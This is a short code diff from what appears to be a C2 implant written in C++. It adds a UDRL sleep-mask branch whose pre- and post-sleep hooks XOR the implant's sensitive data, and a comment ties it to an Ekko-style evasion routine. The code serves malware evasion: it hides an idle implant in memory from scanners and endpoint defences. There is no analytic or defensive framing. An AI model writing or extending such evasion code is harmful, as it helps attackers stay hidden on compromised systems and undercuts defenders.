@@ -592,6 +592,24 @@ static auto declfn mask_post_sleep( instance& inst ) -> void {
 
 #endif /* _WIN64 */
 
+#elif SLEEP_MASK_TYPE == MASK_UDRL
+
+/*
+ * UDRL mask - delegates to evasion_udrl_sleep() which handles the entire
+ * sleep cycle (like Ekko). The pre/post hooks just do the basic XOR of
+ * sensitive fields for cases where the fallback path uses pre/delay/post.
+ */
+
+static auto declfn mask_pre_sleep( instance& inst ) -> void {
+    if ( !inst.evasion.ekko.initialized ) return;
+    xor_sensitive_data( inst );
+}
+
+static auto declfn mask_post_sleep( instance& inst ) -> void {
+    if ( !inst.evasion.ekko.initialized ) return;
+    xor_sensitive_data( inst );
+}
+
 #endif
 
 #endif
